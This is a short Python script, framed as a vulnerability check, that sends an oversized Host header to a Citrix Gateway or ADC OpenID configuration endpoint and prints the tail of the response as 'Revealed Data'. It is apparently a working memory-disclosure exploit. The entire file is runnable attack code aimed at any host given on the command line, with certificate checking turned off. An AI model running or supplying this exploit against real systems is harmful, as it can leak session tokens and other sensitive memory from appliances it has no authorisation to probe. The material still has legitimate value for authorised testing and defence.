#!/usr/bin/env python3

import sys
import argparse
import requests
import urllib3


# Constants
HOST_PAYLOAD_SIZE = 24576
URI_ENDPOINT = "/oauth/idp/.well-known/openid-configuration"

# Disable SSL/TLS warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def parse_arguments():
    """Parse command-line args"""
    parser = argparse.ArgumentParser(description="Check for vulnerability in a Citrix Gateway or ADC target.")
    parser.add_argument('--destination', required=True, help='The Citrix Gateway or ADC destination, excluding the protocol (e.g. 192.168.0.69)')
    return parser.parse_args()

def send_request(server_addr):
    """Send a potentially test request to the specified test server."""
    headers = {
        "Host": "a" * HOST_PAYLOAD_SIZE
    }
    url = f"https://{server_addr}{URI_ENDPOINT}"
    try:
        return requests.get(url, headers=headers, verify=False, timeout=10)
    except requests.RequestException as e:
        raise RuntimeError(f"Error sending request: {e}")

def inspect_target_response(response):
    """Inspect the response from the test target and handle accordingly."""
    if response.status_code == 200:
        print("--- Revealed Data ---")
        print(response.text[131050:])
        print("---      Done      ---")
    else:
        raise RuntimeError(f"Failed to reveal data. HTTP response: {response.status_code}")

def main():
    args = parse_arguments()
    try:
        response = send_request(args.destination)
        inspect_target_response(response)
    except RuntimeError as error:
        print(error)
        sys.exit(1)

if __name__ == "__main__":
    main()
